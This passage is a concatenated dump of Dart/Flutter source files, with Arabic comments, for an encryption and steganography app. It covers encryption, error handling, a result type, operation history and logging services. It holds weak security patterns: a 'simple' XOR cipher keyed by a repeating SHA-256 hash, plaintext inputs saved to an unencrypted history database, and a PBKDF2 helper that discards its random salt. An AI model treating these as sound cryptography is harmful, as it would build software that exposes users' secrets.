      final encrypted = List<int>.filled(textBytes.length, 0);
      for (int i = 0; i < textBytes.length; i++) {
        encrypted[i] = textBytes[i] ^ keyHash[i % keyHash.length];
      }
      
      // تحويل البيانات المشفرة إلى Base64
      final result = base64.encode(encrypted);
      
      _logger.debug('EncryptionService:encryptSimple', 'تم تشفير النص بنجاح');
      return Result.success(result);
    } catch (e, stackTrace) {
      final appError = _errorHandler.handleError(
        e,
        stackTrace,
        context: 'EncryptionService:encryptSimple',
      );
      return Result.failure(appError.message);
    }
  }

  /// فك تشفير نص مشفر باستخدام تشفير متماثل بسيط
  Result<String> decryptSimple(String encryptedText, String key) {
    try {
      // اشتقاق مفتاح بسيط من المفتاح المقدم
      final keyBytes = utf8.encode(key);
      final keyHash = sha256.convert(keyBytes).bytes;
      
      // فك ترميز النص المشفر من Base64
      final encryptedBytes = base64.decode(encryptedText);
      
      // فك تشفير البيانات باستخدام XOR
      final decrypted = List<int>.filled(encryptedBytes.length, 0);
      for (int i = 0; i < encryptedBytes.length; i++) {
        decrypted[i] = encryptedBytes[i] ^ keyHash[i % keyHash.length];
      }
      
      // تحويل البيانات المفكوكة إلى نص
      final result = utf8.decode(decrypted);
      
      _logger.debug('EncryptionService:decryptSimple', 'تم فك تشفير النص بنجاح');
      return Result.success(result);
    } catch (e, stackTrace) {
      final appError = _errorHandler.handleError(
        e,
        stackTrace,
        context: 'EncryptionService:decryptSimple',
      );
      return Result.failure(appError.message);
    }
  }

  /// حساب تجزئة (hash) لنص باستخدام SHA-256
  Result<String> hashSha256(String input) {
    try {
      final bytes = utf8.encode(input);
      final digest = sha256.convert(bytes);
      return Result.success(digest.toString());
    } catch (e, stackTrace) {
      final appError = _errorHandler.handleError(
        e,
        stackTrace,
        context: 'EncryptionService:hashSha256',
      );
      return Result.failure(appError.message);
    }
  }

  /// اشتقاق مفتاح من كلمة مرور باستخدام PBKDF2
  Future<Uint8List> _deriveKey(String password, int keyLength) async {
    final algorithm = cryptography.Pbkdf2(
      macAlgorithm: cryptography.Hmac.sha256(),
      iterations: _pbkdf2Iterations,
      bits: keyLength * 8,
    );
    
    // إنشاء salt عشوائي
    final salt = _generateRandomBytes(16);
    
    // اشتقاق المفتاح
    final secretKey = await algorithm.deriveKey(
      secretKey: cryptography.SecretKey(utf8.encode(password)),
      nonce: salt,
    );
    
    // استخراج البيانات
    final keyData = await secretKey.extractBytes();
    return Uint8List.fromList(keyData);
  }

  /// إنشاء بايتات عشوائية
  Uint8List _generateRandomBytes(int length) {
    final random = Random.secure();
    return Uint8List.fromList(
      List<int>.generate(length, (_) => random.nextInt(256)),
    );
  }
}

/// مزود لخدمة التشفير
final encryptionServiceProvider = Provider<EncryptionService>((ref) {
  final logger = ref.watch(appLoggerProvider);
  final errorHandler = ref.watch(errorHandlerProvider);
  return EncryptionService(logger, errorHandler);
});



// ------------------------------ نهاية الملف: encryption_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: exceptions.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\errors\exceptions.dart
// ----------------------------------------------------------------------

// lib/core/errors/exceptions.dart

// Exception from API (Server error, e.g., 5xx)
class ServerException implements Exception {
  final String message;
  final int? statusCode;

  ServerException(this.message, {this.statusCode});

  @override
  String toString() {
    return 'ServerException: $message (Status Code: ${statusCode ?? 'N/A'})';
  }
}

// Exception for network issues (e.g., no internet, DNS failure)
class NetworkException implements Exception {
  final String message;

  NetworkException(this.message);

  @override
  String toString() => 'NetworkException: $message';
}

// Exception for data parsing issues (e.g., malformed JSON)
class ParsingException implements Exception {
  final String message;

  ParsingException(this.message);

  @override
  String toString() => 'ParsingException: $message';
}

// General Cache Exception (if you implement caching)
class CacheException implements Exception {
  final String message;
  CacheException(this.message);

  @override
  String toString() => 'CacheException: $message';
}

// Exception for Authentication issues
class AuthException implements Exception {
  final String message;
  AuthException(this.message);

  @override
  String toString() => 'AuthException: $message';
}



// ------------------------------ نهاية الملف: exceptions.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: error_handler.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\error_handling\error_handler.dart
// ----------------------------------------------------------------------

// lib/core/error_handling/error_handler.dart
import 'dart:async';
import 'dart:io';

import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../logging/logger_provider.dart';
import '../logging/logger_service.dart';

/// نوع الخطأ لتحديد كيفية معالجته
enum ErrorType {
  /// أخطاء الشبكة
  network,

  /// أخطاء المصادقة
  authentication,

  /// أخطاء قاعدة البيانات
  database,

  /// أخطاء التشفير
  encryption,

  /// أخطاء الملفات
  file,

  /// أخطاء عامة
  general,
}

/// نموذج موحد للأخطاء
class AppError {
  final String message;
  final ErrorType type;
  final dynamic originalError;
  final StackTrace? stackTrace;
  final String? code;

  AppError({
    required this.message,
    required this.type,
    this.originalError,
    this.stackTrace,
    this.code,
  });

  /// إنشاء خطأ من استثناء
  factory AppError.fromException(dynamic error, StackTrace stackTrace) {
    if (error is SocketException || error is TimeoutException) {
      return AppError(
        message:
            'حدث خطأ في الاتصال بالشبكة. يرجى التحقق من اتصالك بالإنترنت والمحاولة مرة أخرى.',
        type: ErrorType.network,
        originalError: error,
        stackTrace: stackTrace,
      );
    } else if (error is FirebaseAuthException) {
      return AppError(
        message: _getAuthErrorMessage(error.code),
        type: ErrorType.authentication,
        originalError: error,
        stackTrace: stackTrace,
        code: error.code,
      );
    } else if (error is FirebaseException) {
      return AppError(
        message: _getFirebaseErrorMessage(error.code),
        type: ErrorType.database,
        originalError: error,
        stackTrace: stackTrace,
        code: error.code,
      );
    } else {
      return AppError(
        message: 'حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى.',
        type: ErrorType.general,
        originalError: error,
        stackTrace: stackTrace,
      );
    }
  }

  /// الحصول على رسالة خطأ المصادقة
  static String _getAuthErrorMessage(String code) {
    switch (code) {
      case 'user-not-found':
        return 'لم يتم العثور على مستخدم بهذا البريد الإلكتروني.';
      case 'wrong-password':
        return 'كلمة المرور غير صحيحة.';
      case 'invalid-email':
        return 'البريد الإلكتروني غير صالح.';
      case 'user-disabled':
        return 'تم تعطيل هذا الحساب.';
      case 'email-already-in-use':
        return 'البريد الإلكتروني مستخدم بالفعل.';
      case 'operation-not-allowed':
        return 'هذه العملية غير مسموح بها.';
      case 'weak-password':
        return 'كلمة المرور ضعيفة جدًا.';
      default:
        return 'حدث خطأ في المصادقة. يرجى المحاولة مرة أخرى.';
    }
  }

  /// الحصول على رسالة خطأ Firebase
  static String _getFirebaseErrorMessage(String code) {
    switch (code) {
      case 'permission-denied':
        return 'ليس لديك صلاحية للوصول إلى هذه البيانات.';
      case 'unavailable':
        return 'الخدمة غير متوفرة حاليًا. يرجى المحاولة مرة أخرى لاحقًا.';
      case 'not-found':
        return 'لم يتم العثور على البيانات المطلوبة.';
      case 'already-exists':
        return 'البيانات موجودة بالفعل.';
      default:
        return 'حدث خطأ في قاعدة البيانات. يرجى المحاولة مرة أخرى.';
    }
  }

  /// تشفير محتوى الخطأ لمنع تسرب المعلومات الحساسة
  String getSecureErrorMessage() {
    // تشفير الرسائل التي قد تحتوي على معلومات حساسة
    switch (type) {
      case ErrorType.authentication:
      case ErrorType.encryption:
        return 'حدث خطأ في العملية. يرجى المحاولة مرة أخرى.';
      default:
        return message;
    }
  }
}

/// معالج الأخطاء الموحد
class ErrorHandler {
  final LoggerService _logger;

  ErrorHandler(this._logger);

  /// معالجة الخطأ وإرجاع نموذج خطأ موحد
  AppError handleError(
    dynamic error,
    StackTrace stackTrace, {
    String? context,
  }) {
    final appError = AppError.fromException(error, stackTrace);

    // تسجيل الخطأ
    _logger.error(
      context ?? 'ErrorHandler',
      appError.message,
      appError.originalError,
      appError.stackTrace ?? stackTrace,
    );

    return appError;
  }

  /// عرض رسالة خطأ للمستخدم
  void showErrorToUser(BuildContext context, AppError error) {
    // استخدام رسالة آمنة لمنع تسرب المعلومات الحساسة
    final secureMessage = error.getSecureErrorMessage();

    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(secureMessage),
        backgroundColor: Colors.red.shade700,
        duration: const Duration(seconds: 5),
      ),
    );
  }

  /// استراتيجية إعادة المحاولة مع الانسحاب التدريجي
  Future<T> retryWithBackoff<T>({
    required Future<T> Function() operation,
    required String context,
    int maxRetries = 3,
    Duration initialDelay = const Duration(seconds: 1),
  }) async {
    int retryCount = 0;
    Duration delay = initialDelay;

    while (true) {
      try {
        return await operation();
      } catch (e, stackTrace) {
        retryCount++;

        if (retryCount >= maxRetries) {
          _logger.error(
            context,
            'فشلت المحاولة بعد $maxRetries محاولات',
            e,
            stackTrace,
          );
          rethrow;
        }

        _logger.warn(
          context,
          'فشلت المحاولة $retryCount من $maxRetries. إعادة المحاولة بعد ${delay.inMilliseconds}ms',
        );

        await Future.delayed(delay);

        // زيادة التأخير بشكل تدريجي (تأخير تراجعي أسي)
        delay *= 2;
      }
    }
  }
}

/// مزود لمعالج الأخطاء
final errorHandlerProvider = Provider<ErrorHandler>((ref) {
  final logger = ref.watch(appLoggerProvider);
  return ErrorHandler(logger);
});



// ------------------------------ نهاية الملف: error_handler.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: result.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\error_handling\result.dart
// ----------------------------------------------------------------------

// lib/core/error_handling/result.dart

/// نموذج النتيجة الموحد للتعامل مع العمليات التي قد تنجح أو تفشل
class Result<T> {
  final T? _value;
  final String? _error;
  final bool _isSuccess;

  /// إنشاء نتيجة ناجحة
  const Result.success(T value)
      : _value = value,
        _error = null,
        _isSuccess = true;

  /// إنشاء نتيجة فاشلة
  const Result.failure(String error)
      : _value = null,
        _error = error,
        _isSuccess = false;

  /// التحقق مما إذا كانت النتيجة ناجحة
  bool get isSuccess => _isSuccess;

  /// التحقق مما إذا كانت النتيجة فاشلة
  bool get isFailure => !_isSuccess;

  /// الحصول على القيمة في حالة النجاح
  T get value {
    if (_isSuccess) {
      return _value as T;
    }
    throw Exception('محاولة الوصول إلى قيمة نتيجة فاشلة: $_error');
  }

  /// الحصول على رسالة الخطأ في حالة الفشل
  String get error {
    if (!_isSuccess) {
      return _error!;
    }
    throw Exception('محاولة الوصول إلى خطأ نتيجة ناجحة');
  }

  /// تنفيذ دالة مختلفة حسب حالة النتيجة
  R fold<R>(R Function(T value) onSuccess, R Function(String error) onFailure) {
    if (_isSuccess) {
      return onSuccess(_value as T);
    } else {
      return onFailure(_error!);
    }
  }

  /// تحويل النتيجة إلى نتيجة من نوع آخر
  Result<R> map<R>(R Function(T value) transform) {
    if (_isSuccess) {
      try {
        return Result.success(transform(_value as T));
      } catch (e) {
        return Result.failure('فشل في تحويل النتيجة: $e');
      }
    } else {
      return Result.failure(_error!);
    }
  }

  /// تحويل النتيجة إلى نتيجة من نوع آخر مع إمكانية الفشل
  Result<R> flatMap<R>(Result<R> Function(T value) transform) {
    if (_isSuccess) {
      try {
        return transform(_value as T);
      } catch (e) {
        return Result.failure('فشل في تحويل النتيجة: $e');
      }
    } else {
      return Result.failure(_error!);
    }
  }

  @override
  String toString() {
    if (_isSuccess) {
      return 'Success: $_value';
    } else {
      return 'Failure: $_error';
    }
  }

  @override
  bool operator ==(Object other) {
    if (identical(this, other)) return true;
    return other is Result<T> &&
        other._isSuccess == _isSuccess &&
        other._value == _value &&
        other._error == _error;
  }

  @override
  int get hashCode => Object.hash(_isSuccess, _value, _error);
}



// ------------------------------ نهاية الملف: result.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: history_item.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\history\history_item.dart
// ----------------------------------------------------------------------

// lib/core/history/history_item.dart

enum OperationType {
  encryptAes,
  decryptAes,
  encodeZeroWidth,
  decodeZeroWidth,
  encryptThenHide,
  revealThenDecrypt,
  encryptFile,
  decryptFile,
  embedImageStego,
  extractImageStego,
}

class HistoryItem {
  final String id;
  final DateTime timestamp;
  final OperationType operationType;
  final String? originalInput; // النص الأصلي قبل التشفير/الإخفاء
  final String? processedInput; // النص المشفر/المخفي المدخل للعملية العكسية
  final String? coverText; // نص الغطاء المستخدم
  final String output; // الناتج النهائي للعملية
  final bool usedPassword;
  final bool usedSteganography;

  HistoryItem({
    required this.id,
    required this.timestamp,
    required this.operationType,
    this.originalInput,
    this.processedInput,
    this.coverText,
    required this.output,
    required this.usedPassword,
    required this.usedSteganography,
  });

  Map<String, dynamic> toJson() => {
        'id': id,
        'timestamp': timestamp.toIso8601String(),
        'operationType': operationType.index,
        if (originalInput != null) 'originalInput': originalInput,
        if (processedInput != null) 'processedInput': processedInput,
        if (coverText != null) 'coverText': coverText,
        'output': output,
        'usedPassword': usedPassword,
        'usedSteganography': usedSteganography,
      };

  factory HistoryItem.fromJson(Map<String, dynamic> json) {
    return HistoryItem(
      id: json['id'] ?? DateTime.now().millisecondsSinceEpoch.toString(),
      timestamp: DateTime.parse(json['timestamp']),
      operationType: OperationType
          .values[json['operationType'] ?? OperationType.encryptAes.index],
      originalInput: json['originalInput'] as String?,
      processedInput: json['processedInput'] as String?,
      coverText: json['coverText'] as String?,
      output: json['output'] ?? '',
      usedPassword: json['usedPassword'] ?? false,
      usedSteganography: json['usedSteganography'] ?? false,
    );
  }

  String get operationDescription {
    switch (operationType) {
      case OperationType.encryptAes:
        return 'تشفير نص (AES-GCM)';
      case OperationType.decryptAes:
        return 'فك تشفير نص (AES-GCM)';
      case OperationType.encodeZeroWidth:
        return 'إخفاء نص (Zero-Width)';
      case OperationType.decodeZeroWidth:
        return 'كشف نص (Zero-Width)';
      case OperationType.encryptThenHide:
        return 'تشفير نص ثم إخفاء';
      case OperationType.revealThenDecrypt:
        return 'كشف نص ثم فك تشفير';
      case OperationType.encryptFile:
        return 'تشفير ملف';
      case OperationType.decryptFile:
        return 'فك تشفير ملف';
      case OperationType.embedImageStego:
        return 'إخفاء بيانات في صورة';
      case OperationType.extractImageStego:
        return 'استخراج بيانات من صورة';
    }
  }
}



// ------------------------------ نهاية الملف: history_item.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: history_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\history\history_service.dart
// ----------------------------------------------------------------------

// lib/core/history/history_service.dart
import 'dart:async';

import 'package:flutter/foundation.dart' show kIsWeb;
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:path/path.dart'
    as path_lib; // استخدام alias لتجنب المشاكل المستقبلية
import 'package:path_provider/path_provider.dart';
import 'package:sembast/sembast_io.dart';
import 'package:sembast_web/sembast_web.dart';

import '../logging/logger_provider.dart';
import '../logging/logger_service.dart';
import 'history_item.dart';

final historyServiceProvider = Provider<HistoryService>((ref) {
  final logger = ref.watch(appLoggerProvider);
  return HistoryService(logger);
});

class HistoryService {
  static const String _dbName = 'conduit_history_v3.db';
  static const String _storeName = 'operations_history_v3';
  static const int _maxHistoryItems = 100; // تم الإبقاء على الاسم الصحيح هنا

  Database? _db;
  final _store = intMapStoreFactory.store(_storeName);
  final LoggerService _logger;

  HistoryService(this._logger);

  Future<Database> get _database async {
    if (_db == null) {
      _logger.info("_database_getter", "Database is null, initializing...");
      await _initDb();
    }
    // لا حاجة للتحقق من hasBeenOpened هنا، Sembast يتعامل مع ذلك عند الفتح
    if (_db == null) {
      _logger.error(
          "_database_getter", "Database is STILL NULL after _initDb call!");
      throw Exception("Sembast database could not be initialized or opened.");
    }
    return _db!;
  }

  Future<void> _initDb() async {
    const tag = "_initDb";
    if (_db != null) {
      // إذا لم يكن null، افترض أنه تم التعامل معه
      _logger.info(tag,
          "Database instance may already exist or Sembast will handle re-opening.");
      // إذا كنت تريد أن تكون أكثر أمانًا، يمكنك محاولة الإغلاق أولاً إذا لم يكن مفتوحًا
      // ولكن هذا قد يكون معقدًا. Sembast عادةً ما يكون جيدًا في هذا.
      // إذا كنت تواجه مشاكل "Database already opened"، يمكنك إضافة منطق هنا.
      // For now, let's assume if _db is not null, it's either open or Sembast can open it.
      // If it was closed manually AND not set to null, that's a different state to handle.
      // The simplest is: if _db is null, open. Otherwise, assume Sembast handles it.
      // To be very safe against "already opened" if init is called multiple times without closing:
      // if (_db != null) {
      //   try { await _db!.close(); } catch(_){} // ignore errors if already closed
      //   _db = null;
      // }
      return; // تم تعديل هذا الشرط ليكون أبسط
    }

    DatabaseFactory dbFactory;
    String dbPath;

    if (kIsWeb) {
      dbFactory = databaseFactoryWeb;
      dbPath = _dbName;
      _logger.info(tag, "Using Sembast Web DB: $dbPath");
    } else {
      dbFactory = databaseFactoryIo;
      try {
        final appDocDir = await getApplicationDocumentsDirectory();
        dbPath = path_lib.join(appDocDir.path, _dbName); // استخدام alias
        _logger.info(tag, "Using Sembast IO DB at: $dbPath");
      } catch (e, stackTrace) {
        _logger.error(tag, "Error getting application documents directory", e,
            stackTrace);
        rethrow;
      }
    }
    try {
      _db = await dbFactory.openDatabase(dbPath);
      _logger.info(tag, "Sembast DB Initialized successfully.");
    } catch (e, stackTrace) {
      _logger.error(
          tag, "Failed to open Sembast DB at path: $dbPath", e, stackTrace);
      _db = null;
      rethrow;
    }
  }

  // ... (loadHistory, addHistoryItem, deleteItem, clearHistory) كما كانت في الرد السابق ...
  // (مع التأكد من استخدام _maxHistoryItems بشكل صحيح في addHistoryItem)

  Future<void> addHistoryItem(HistoryItem newItem) async {
    const tag = "addHistoryItem";
    _logger.info(tag,
        "Adding new history item: ${newItem.operationDescription}, ID: ${newItem.id}");
    try {
      final db = await _database;
      await _store.add(db, newItem.toJson());
      _logger.debug(tag, "Item added successfully. ID: ${newItem.id}");

      final count = await _store.count(db);
      if (count > _maxHistoryItems) {
        // <<<< استخدام الثابت الصحيح
        _logger.info(tag,
            "History size ($count) exceeds max ($_maxHistoryItems). Trimming...");
        final finder = Finder(
            sortOrders: [SortOrder('timestamp', true)],
            limit: count - _maxHistoryItems); // <<<< استخدام الثابت الصحيح
        final recordsToDelete = await _store.findKeys(db, finder: finder);
        if (recordsToDelete.isNotEmpty) {
          await _store.records(recordsToDelete).delete(db);
          _logger.info(
              tag, "Trimmed ${recordsToDelete.length} old history items.");
        }
      }
    } catch (e, stackTrace) {
      _logger.error(
          tag, "Error adding history item. ID: ${newItem.id}", e, stackTrace);
    }
  }

  Future<List<HistoryItem>> loadHistory() async {
    const tag = "loadHistory";
    _logger.info(tag, "Loading history from Sembast.");
    try {
      final db = await _database;
      final finder = Finder(sortOrders: [SortOrder('timestamp', false)]);
      final records = await _store.find(db, finder: finder);
      _logger.debug(tag, "Found ${records.length} history records.");
      return records
          .map((snapshot) {
            try {
              return HistoryItem.fromJson(snapshot.value);
            } catch (e, stackTrace) {
              _logger.error(
                  tag,
                  "Error parsing HistoryItem from JSON: ${snapshot.value}",
                  e,
                  stackTrace);
              return null;
            }
          })
          .whereType<HistoryItem>()
          .toList();
    } catch (e, stackTrace) {
      _logger.error(tag, "Error loading history collection", e, stackTrace);
      return [];
    }
  }

  Future<void> deleteItem(String id) async {
    const tag = "deleteItem";
    _logger.info(tag, "Deleting history item with id: $id");
    try {
      final db = await _database;
      final finder = Finder(filter: Filter.equals('id', id));
      final deletedCount = await _store.delete(db, finder: finder);
      _logger.info(tag, "Deleted $deletedCount item(s) with id: $id.");
    } catch (e, stackTrace) {
      _logger.error(
          tag, "Error deleting history item with id: $id", e, stackTrace);
    }
  }

  Future<void> clearHistory() async {
    const tag = "clearHistory";
    _logger.info(tag, "Clearing all history items.");
    try {
      final db = await _database;
      final deletedCount = await _store.delete(db);
      _logger.info(tag, "Cleared $deletedCount history items.");
    } catch (e, stackTrace) {
      _logger.error(tag, "Error clearing history", e, stackTrace);
    }
  }

  Future<void> closeDb() async {
    const tag = "closeDb";
    if (_db != null) {
      try {
        // Sembast's close is idempotent, safe to call even if already closed or being closed.
        await _db!.close();
        _logger.info(tag, "Sembast DB Close requested/completed.");
      } catch (e, stackTrace) {
        _logger.error(tag, "Error closing Sembast DB", e, stackTrace);
      } finally {
        _db = null;
      }
    } else {
      _logger.info(
          tag, "Sembast DB was already null, no action taken to close.");
    }
  }
}



// ------------------------------ نهاية الملف: history_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: enhanced_logger_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\logging\enhanced_logger_service.dart
// ----------------------------------------------------------------------

// lib/services/enhanced_logger_service.dart

import 'dart:async';
import 'dart:io';

import 'package:flutter/foundation.dart';
import 'package:intl/intl.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';

/// خدمة تسجيل محسنة مع دعم لكتابة السجلات في ملف وعرضها في واجهة المستخدم
class EnhancedLoggerService {
  static final EnhancedLoggerService _instance =
      EnhancedLoggerService._internal();
  factory EnhancedLoggerService() => _instance;

  EnhancedLoggerService._internal() {
    _initLogFile();
  }

  // مسار ملف السجل
  String? _logFilePath;

  // مؤقت لتنظيف السجلات القديمة
  Timer? _cleanupTimer;

  // تدفق لإرسال السجلات إلى واجهة المستخدم
  final StreamController<String> _logStreamController =
      StreamController<String>.broadcast();
  Stream<String> get logStream => _logStreamController.stream;

  // الحد الأقصى لحجم ملف السجل (5 ميجابايت)
  static const int _maxLogFileSize = 5 * 1024 * 1024;

  // الحد الأقصى لعمر السجلات (7 أيام)
  static const int _maxLogAgeDays = 7;

  /// تهيئة ملف السجل
  Future<void> _initLogFile() async {
    try {
      final Directory appDocDir = await getApplicationDocumentsDirectory();
      final String logsDir = '${appDocDir.path}/logs';

      // إنشاء مجلد السجلات إذا لم يكن موجوداً
      final Directory logsDirObj = Directory(logsDir);
      if (!await logsDirObj.exists()) {
        await logsDirObj.create(recursive: true);
      }

      // إنشاء ملف سجل جديد لكل يوم
      final String today = DateFormat('yyyyMMdd').format(DateTime.now());
      _logFilePath = '$logsDir/app_log_$today.txt';

      // بدء مؤقت لتنظيف السجلات القديمة (مرة واحدة يومياً)
      _cleanupTimer =
          Timer.periodic(const Duration(days: 1), (_) => _cleanupOldLogs());

      // تنظيف السجلات القديمة عند بدء التشغيل
      _cleanupOldLogs();

      debug('EnhancedLoggerService',
          'تم تهيئة خدمة التسجيل. مسار ملف السجل: $_logFilePath');
    } catch (e) {
      debugPrint('خطأ في تهيئة خدمة التسجيل: $e');
    }
  }

  /// تنظيف السجلات القديمة
  Future<void> _cleanupOldLogs() async {
    try {
      final Directory appDocDir = await getApplicationDocumentsDirectory();
      final String logsDir = '${appDocDir.path}/logs';
      final Directory logsDirObj = Directory(logsDir);

      if (await logsDirObj.exists()) {
        final List<FileSystemEntity> files = await logsDirObj.list().toList();
        final DateTime now = DateTime.now();

        for (final FileSystemEntity file in files) {
          if (file is File && file.path.endsWith('.txt')) {
            // التحقق من عمر الملف
            final FileStat stat = await file.stat();
            final int daysOld = now.difference(stat.modified).inDays;

            if (daysOld > _maxLogAgeDays) {
              await file.delete();
              debug(
                  'EnhancedLoggerService', 'تم حذف ملف سجل قديم: ${file.path}');
            }

            // التحقق من حجم الملف
            if (stat.size > _maxLogFileSize) {
              // إنشاء ملف جديد إذا كان الملف الحالي كبيراً جداً
              final String timestamp =
                  DateFormat('yyyyMMdd_HHmmss').format(now);
              final String newPath =
                  file.path.replaceAll('.txt', '_$timestamp.txt');
              await file.rename(newPath);
              debug('EnhancedLoggerService',
                  'تم إعادة تسمية ملف سجل كبير: ${file.path} -> $newPath');

              // إذا كان هذا هو الملف الحالي، قم بتحديث المسار
              if (file.path == _logFilePath) {
                final String today = DateFormat('yyyyMMdd').format(now);
                _logFilePath = '$logsDir/app_log_$today.txt';
              }
            }
          }
        }
      }
    } catch (e) {
      debugPrint('خطأ في تنظيف السجلات القديمة: $e');
    }
  }

  /// كتابة سجل في الملف
  Future<void> _writeToLogFile(String logEntry) async {
    if (_logFilePath == null) return;

    try {
      final File logFile = File(_logFilePath!);
      await logFile.writeAsString('$logEntry\n', mode: FileMode.append);
    } catch (e) {
      debugPrint('خطأ في كتابة السجل في الملف: $e');
    }
  }

  /// تسجيل رسالة تصحيح
  void debug(String tag, String message) {
    _log('DEBUG', tag, message);
  }

  /// تسجيل رسالة معلومات
  void info(String tag, String message) {
    _log('INFO', tag, message);
  }

  /// تسجيل رسالة تحذير
  void warn(String tag, String message) {
    _log('WARN', tag, message);
  }

  /// تسجيل رسالة خطأ
  void error(String tag, String message,
      [dynamic error, StackTrace? stackTrace]) {
    final String errorMsg = error != null ? ' Error: $error' : '';
    final String stackMsg =
        stackTrace != null ? '\nStackTrace: $stackTrace' : '';
    _log('ERROR', tag, '$message$errorMsg$stackMsg');
  }

  /// تسجيل رسالة
  void _log(String level, String tag, String message) {
    final String timestamp =
        DateFormat('yyyy-MM-dd HH:mm:ss.SSS').format(DateTime.now());
    final String logEntry = '[$timestamp] $level/$tag: $message';

    // طباعة السجل في وحدة التحكم
    debugPrint(logEntry);

    // كتابة السجل في الملف
    _writeToLogFile(logEntry);

    // إرسال السجل إلى تدفق السجلات
    _logStreamController.add(logEntry);

    // حفظ آخر 100 سجل في التفضيلات المشتركة للوصول السريع
    _saveToRecentLogs(logEntry);
  }

  /// حفظ السجل في قائمة السجلات الأخيرة
  Future<void> _saveToRecentLogs(String logEntry) async {
    try {
      final SharedPreferences prefs = await SharedPreferences.getInstance();
      List<String> recentLogs = prefs.getStringList('recent_logs') ?? [];

      // إضافة السجل الجديد في البداية
      recentLogs.insert(0, logEntry);

      // الاحتفاظ بآخر 100 سجل فقط
      if (recentLogs.length > 100) {
        recentLogs = recentLogs.sublist(0, 100);
      }

      await prefs.setStringList('recent_logs', recentLogs);
    } catch (e) {
      debugPrint('خطأ في حفظ السجل في التفضيلات المشتركة: $e');
    }
  }

  /// الحصول على السجلات الأخيرة
  Future<List<String>> getRecentLogs() async {
    try {
      final SharedPreferences prefs = await SharedPreferences.getInstance();
      return prefs.getStringList('recent_logs') ?? [];
    } catch (e) {
      debugPrint('خطأ في الحصول على السجلات الأخيرة: $e');
      return [];
    }
  }

  /// الحصول على محتوى ملف السجل
  Future<String> getLogFileContent() async {
    if (_logFilePath == null) return 'ملف السجل غير متاح';

    try {
      final File logFile = File(_logFilePath!);
      if (await logFile.exists()) {
        return await logFile.readAsString();
      } else {
        return 'ملف السجل غير موجود';
      }
    } catch (e) {
      return 'خطأ في قراءة ملف السجل: $e';
    }
  }

  /// مشاركة ملف السجل
  Future<String?> getLogFilePath() async {
    return _logFilePath;
  }

  /// إغلاق خدمة التسجيل
  void dispose() {
    _cleanupTimer?.cancel();
    _logStreamController.close();
  }
}



// ------------------------------ نهاية الملف: enhanced_logger_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: logger_provider.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\logging\logger_provider.dart
// ----------------------------------------------------------------------

// lib/core/logging/logger_provider.dart
import 'package:flutter_riverpod/flutter_riverpod.dart';

import 'logger_service.dart';

// LoggerService provider that takes a class name (tag)
// هذا الـ provider سيعيد دالة تأخذ اسم الكلاس وترجع logger
// بدلًا من ذلك، يمكننا جعل كل كلاس يطلب logger خاص به
// الطريقة الأبسط هي logger عام.
final loggerServiceProvider =
    Provider.family<LoggerService, String>((ref, className) {
  return LoggerService(className);
});

// مثال لكيفية استخدامه في كلاس آخر:
// final logger = ref.watch(loggerServiceProvider('MyClassName'));
// logger.info("SomeTag", "My message");

// أو logger عام بسيط إذا لم ترد تمرير اسم الكلاس في كل مرة
final appLoggerProvider = Provider<LoggerService>((ref) {
  return LoggerService("AppGlobal"); // اسم عام
});



// ------------------------------ نهاية الملف: logger_provider.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: logger_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\logging\logger_service.dart
// ----------------------------------------------------------------------

// lib/core/logging/logger_service.dart
import 'dart:async';

import 'package:flutter/foundation.dart'; // For kDebugMode

// تعريف لتعداد مستويات السجل، متوافق مع الاستخدام في DebugMonitorNotifier
// تم توحيد الأسماء إلى حروف كبيرة لتجنب الالتباس
enum LogLevel {
  DEBUG,
  INFO,
  WARN,
  ERROR,
  CRITICAL,
  SUCCESS // مضاف بناءً على الاستخدام في DebugMonitorNotifier
}

// تعريف لفئة حدث السجل، لتمريرها عبر Stream
class LogEvent {
  final String message;
  final LogLevel level;
  final DateTime timestamp;
  final String source; // سيكون هذا هو _className من LoggerService

  LogEvent({
    required this.message,
    required this.level,
    required this.timestamp,
    required this.source,
  });
}

class LoggerService {
  final String _className; // اسم الفئة التي تستخدم هذا المسجّل
  LogLevel currentLogLevel;

  // متحكم التدفق لبث أحداث السجل
  final _logController = StreamController<LogEvent>.broadcast();

  // المتحصِّل 'logStream' المطلوب بواسطة DebugMonitorNotifier
  Stream<LogEvent> get logStream => _logController.stream;

  LoggerService(this._className)
      : currentLogLevel = kDebugMode ? LogLevel.DEBUG : LogLevel.INFO;

  // Getters للتحقق من مستوى السجل الحالي (اختياري، لكن موجود في الشيفرة الأصلية)
  bool get isDebugEnabled => currentLogLevel.index <= LogLevel.DEBUG.index;
  bool get isInfoEnabled => currentLogLevel.index <= LogLevel.INFO.index;
  bool get isWarnEnabled => currentLogLevel.index <= LogLevel.WARN.index;
  bool get isErrorEnabled => currentLogLevel.index <= LogLevel.ERROR.index;
  bool get isCriticalEnabled =>
      currentLogLevel.index <= LogLevel.CRITICAL.index;

  void _log(LogLevel level, String tag, String message,
